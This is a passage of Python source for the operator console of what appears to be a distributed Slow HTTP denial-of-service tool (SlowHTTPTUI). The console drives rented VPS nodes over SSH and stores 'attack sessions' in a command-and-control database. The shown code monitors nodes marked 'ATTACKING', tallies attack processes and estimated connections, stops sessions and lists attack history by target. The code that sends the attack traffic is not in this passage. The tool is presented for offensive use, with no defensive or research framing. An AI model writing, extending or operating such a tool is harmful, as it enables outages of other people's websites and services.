                print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Last Update'}")
                print("-" * 60)
                
                total_processes = 0
                active_vps = 0
                
                for vps_ip, data in status_data.items():
                    processes = data.get('active_processes', 0)
                    status = "ATTACKING" if processes > 0 else "IDLE"
                    color = Colors.GREEN if processes > 0 else Colors.RED
                    
                    total_processes += processes
                    if processes > 0:
                        active_vps += 1
                    
                    print(f"{vps_ip:<15} {color}{status:<12}{Colors.END} {processes:<10} {datetime.now().strftime('%H:%M:%S')}")
                
                print(f"\n{Colors.BOLD}ATTACK STATISTICS:{Colors.END}")
                print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.END}")
                print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.END}")
                
                est_connections = total_processes * attack_info.get('parameters', {}).get('connections_per_vps', 1000)
                print(f"{Colors.YELLOW}Estimated Connections: {est_connections:,}{Colors.END}")
                
                print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring | Type 'q' then Enter to quit{Colors.END}")
                
                # Non-blocking input check
                import select
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    user_input = input().strip().lower()
                    if user_input == 'q':
                        break
                    elif user_input == 'stop':
                        self.stop_attack_prompt(session_id)
                        break
                
                time.sleep(5)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.END}")
            
            # Ask if user wants to stop the attack
            try:
                stop_attack = input(f"{Colors.RED}Stop the attack? (y/N): {Colors.END}").strip().lower()
                if stop_attack == 'y':
                    self.attack_manager.stop_attack(session_id)
            except KeyboardInterrupt:
                pass
        
        input("\nPress Enter to continue...")
    
    def stop_attack_prompt(self, session_id):
        confirm = input(f"\n{Colors.RED}Stop attack session {session_id}? (y/N): {Colors.END}").strip().lower()
        if confirm == 'y':
            self.attack_manager.stop_attack(session_id)
            print(f"{Colors.GREEN}[SUCCESS] Attack stopped{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[CANCELLED] Attack continues{Colors.END}")
    
    def attack_history_menu(self):
        self.clear_screen()
        self.print_banner()
        
        conn = sqlite3.connect('c2_database.db')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT 20')
        sessions = cursor.fetchall()
        conn.close()
        
        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.END}")
        print("=" * 30)
        
        if not sessions:
            print(f"\n{Colors.YELLOW}No attack history found{Colors.END}")
        else:
            print(f"\n{'ID':<4} {'Session Name':<20} {'Target':<25} {'Type':<12} {'Status':<10} {'Start Time'}")
            print("-" * 100)
            
            for session in sessions:
                start_time = datetime.fromisoformat(session[5]).strftime('%Y-%m-%d %H:%M:%S') if session[5] else 'N/A'
                status_color = Colors.GREEN if session[7] == 'completed' else Colors.YELLOW if session[7] == 'running' else Colors.RED
                
                print(f"{session[0]:<4} {session[1][:19]:<20} {session[2][:24]:<25} {session[3]:<12} {status_color}{session[7]:<10}{Colors.END} {start_time}")
        
        input("\nPress Enter to continue...")
    
    def run(self):
        while self.running:
            try:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attack()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    print(f"{Colors.YELLOW}[EXIT] Goodbye!{Colors.END}")
                    break
                else:
                    print(f"{Colors.RED}[ERROR] Invalid option{Colors.END}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.END}")
                input("Press Enter to continue...")

def main():
    # Check if running as root (recommended for some operations)
    if os.geteuid() != 0:
        print(f"{Colors.YELLOW}[WARNING] Not running as root. Some operations may fail.{Colors.END}")
        time.sleep(2)
    
    # Check dependencies
    try:
        import paramiko
        from cryptography.fernet import Fernet
    except ImportError:
        print(f"{Colors.RED}[ERROR] Missing dependencies. Please install:{Colors.END}")
        print("pip3 install paramiko cryptography")
        sys.exit(1)
    
    # Initialize and run TUI
    tui = SlowHTTPTUI()
    tui.run()

if __name__ == '__main__':
    main()